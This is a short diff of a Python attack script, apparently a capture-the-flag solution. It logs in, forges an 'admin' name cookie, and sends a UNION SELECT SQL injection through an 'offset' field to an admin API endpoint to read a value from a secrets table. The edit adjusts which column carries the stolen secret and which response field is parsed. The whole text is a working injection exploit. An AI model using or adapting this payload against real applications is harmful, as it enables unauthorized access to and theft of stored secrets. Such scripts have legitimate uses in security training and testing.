@@ -14,9 +14,9 @@ login = login_request.headers
 token = login["Set-Cookie"].split("token=")[1].split(';')[0]
 
 cookies = {"token": token, "name": "admin"}
-inject = str(datetime.datetime.now()) + "' UNION SELECT NULL, secret, NULL, NULL, NULL, NULL, NULL, NULL FROM secrets --"
+inject = str(datetime.datetime.now()) + "' UNION SELECT secret, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM secrets --"
 flag_data = {"offset": inject, "sorting": "lastmodified"}
 flag_request = requests.post(host + "/api/getprojectsadmin", json=flag_data, cookies=cookies)
 text = flag_request.text
-flag = text.split("\"userName\":\"")[1].split('"')[0]
+flag = text.split("\"code\":\"")[1].split('"')[0]
 print(flag)
